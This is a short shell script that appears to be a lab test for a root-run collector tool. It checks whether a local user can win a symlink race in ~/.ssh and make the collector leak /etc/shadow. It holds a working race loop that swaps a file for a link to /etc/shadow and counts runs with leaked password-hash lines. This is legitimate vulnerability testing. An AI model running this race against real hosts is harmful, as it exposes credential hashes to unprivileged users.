#!/bin/sh
# Lab test (test only, root on a lab host via labctl.py): can a local user make the root collector read a
# file it should not, by swapping a file in ~/.ssh for a symlink between the collector's check and its read?
# The user "ops" swaps ~/.ssh/known_hosts_race between a regular file and a link to /etc/shadow; root runs the
# collector N times (as SSHBITE would) and counts runs whose output contains a full /etc/shadow line.
N=${N:-300}
C=/usr/local/libexec/sshbite/sshbite-collect
su -s /bin/sh ops -c 'cd ~/.ssh && echo "x ssh-ed25519 AAAA" > f && while :; do
  ln -sf /etc/shadow l.tmp; mv -T l.tmp known_hosts_race; cp f r.tmp; mv -T r.tmp known_hosts_race; done' &
P=$!
sleep 1
hit=0; i=0
while [ "$i" -lt "$N" ]; do
  i=$((i + 1))
  # a full shadow line (5+ fields) inside a file content block = leaked; the SHADOW section only has user:X:
  if "$C" | grep -Eq '^\|root:[^:]*:[0-9]+:[0-9]*:[0-9]+:'; then hit=$((hit + 1)); fi
done
kill "$P"; pkill -u ops -f known_hosts_race 2>/dev/null
rm -f /home/ops/.ssh/known_hosts_race /home/ops/.ssh/f /home/ops/.ssh/l.tmp /home/ops/.ssh/r.tmp
echo "collector runs: $N, runs with a full /etc/shadow line in the output: $hit"
"$C" | grep -Ec '^\|root:[^:]*:[0-9]+:[0-9]*:[0-9]+:' | sed 's/^/without race: /'
